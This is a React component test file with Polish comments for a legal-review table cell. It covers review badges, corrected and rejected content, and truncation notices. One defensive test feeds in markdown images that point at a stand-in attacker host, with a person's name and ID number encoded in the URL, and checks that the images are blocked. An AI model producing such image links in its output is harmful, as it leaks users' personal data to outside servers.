// Testy komorki tabular (spec 012 US1): badge human-review (ADR-0126) i
// effective content - corrected pokazuje tresc poprawiona przez prawnika,
// rejected wygasza wynik. To jest siatka na regresje ficzera governance,
// ktorego kompilator nie pilnuje.
import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { formatNumber, t } from "@/i18n";
import type { TabularCell as TCell } from "../shared/types";
import { TabularCell, coverageLabel } from "./TabularCell";

function makeCell(over: Partial<TCell> = {}): TCell {
    return {
        id: "c1",
        review_id: "r1",
        document_id: "d1",
        column_index: 0,
        content: { summary: "Wartosc oryginalna" },
        status: "done",
        created_at: "2026-07-04T00:00:00Z",
        ...over,
    };
}

function renderCell(cell: TCell) {
    return render(<TabularCell cell={cell} onExpand={vi.fn()} />);
}

describe("TabularCell - human-review (ADR-0126)", () => {
    it("bez review: brak badge (zero szumu)", () => {
        renderCell(makeCell());
        expect(screen.getByText("Wartosc oryginalna")).toBeTruthy();
        for (const key of [
            "tabular.reviewStatusApproved",
            "tabular.reviewStatusRejected",
            "tabular.reviewStatusCorrected",
        ] as const) {
            expect(screen.queryByTitle(t(key))).toBeNull();
        }
    });

    it("approved: zielony badge z tytulem statusu", () => {
        renderCell(makeCell({ review_action: "approved" }));
        expect(
            screen.getByTitle(t("tabular.reviewStatusApproved")),
        ).toBeTruthy();
    });

    it("corrected: pokazuje tresc poprawiona zamiast wygenerowanej", () => {
        renderCell(
            makeCell({
                review_action: "corrected",
                corrected_content: "Tresc poprawiona przez prawnika",
            }),
        );
        expect(
            screen.getByText("Tresc poprawiona przez prawnika"),
        ).toBeTruthy();
        expect(screen.queryByText("Wartosc oryginalna")).toBeNull();
        expect(
            screen.getByTitle(t("tabular.reviewStatusCorrected")),
        ).toBeTruthy();
    });

    it("rejected: tresc wygaszona (line-through) + badge", () => {
        renderCell(makeCell({ review_action: "rejected" }));
        expect(
            screen.getByTitle(t("tabular.reviewStatusRejected")),
        ).toBeTruthy();
        const text = screen.getByText("Wartosc oryginalna");
        expect(text.closest(".line-through")).not.toBeNull();
    });
});

// Audyt 2026-09, A-20: komorka renderuje wynik modelu - obraz markdown nie moze
// wyslac zadania bez klikniecia, ani w wierszu, ani w rozwinietej nakladce.
describe("TabularCell - obraz markdown w wyniku (A-20)", () => {
    const LEAK = "Jan%20Testowy%2044051401458";

    it("wiersz i nakladka: brak <img>, jest informacja o blokadzie", () => {
        const { container } = renderCell(
            makeCell({
                content: {
                    summary: `Kara umowna. ![x](https://atakujacy.example/t.gif?d=${LEAK})\n\n![y][r]\n\n[r]: //atakujacy.example/r.gif?d=${LEAK}`,
                },
            }),
        );
        expect(container.querySelectorAll("img")).toHaveLength(0);
        // Rozwiniecie nakladki (klik w wiersz) renderuje pelny markdown.
        fireEvent.click(screen.getByText(/Kara umowna\./));
        expect(container.querySelectorAll("img")).toHaveLength(0);
        expect(
            container.querySelectorAll("[data-markdown-image-blocked]").length,
        ).toBeGreaterThanOrEqual(2);
    });
});

// Audyt 2026-09, D-15 i D-11: pokrycie dokumentu i dokument bez tekstu.
describe("TabularCell - pokrycie dokumentu (D-15) i brak tekstu (D-11)", () => {
    const coverage = {
        truncated: true as const,
        chars_sent: 120_000,
        chars_total: 250_000,
    };

    it("bez coverage: brak znacznika", () => {
        const { container } = renderCell(makeCell());
        expect(container.querySelector("[data-coverage-truncated]")).toBeNull();
    });

    it("coverage.truncated: znacznik w wierszu i tekst N z M w nakladce", () => {
        const { container } = renderCell(
            makeCell({ content: { summary: "Not Found", coverage } }),
        );
        const label = coverageLabel(coverage);
        expect(label).toContain(formatNumber(120_000));
        expect(label).toContain(formatNumber(250_000));
        expect(
            container
                .querySelector("[data-coverage-truncated]")
                ?.getAttribute("aria-label"),
        ).toBe(label);
        fireEvent.click(screen.getByText("Not Found"));
        const note = container.querySelector("[data-coverage-truncated-note]");
        expect(note?.textContent).toBe(label);
    });

    it("document_coverage z SSE dziala tak samo jak content.coverage", () => {
        const { container } = renderCell(
            makeCell({
                content: { summary: "Wynik" },
                document_coverage: coverage,
            }),
        );
        expect(
            container
                .querySelector("[data-coverage-truncated]")
                ?.getAttribute("aria-label"),
        ).toBe(coverageLabel(coverage));
    });

    it("blad document_no_text: czytelny opis zamiast samej ikony", () => {
        const { container } = renderCell(
            makeCell({
                status: "error",
                content: null,
                error_reason: "document_no_text",
            }),
        );
        expect(screen.getByText(t("tabularCoverage.noText"))).toBeTruthy();
        expect(
            container
                .querySelector("[data-cell-error-reason]")
                ?.getAttribute("title"),
        ).toBe(t("tabularCoverage.noTextHint"));
    });

    it("blad bez powodu: dotychczasowa ikona, bez opisu braku tekstu", () => {
        renderCell(makeCell({ status: "error", content: null }));
        expect(screen.queryByText(t("tabularCoverage.noText"))).toBeNull();
    });
});
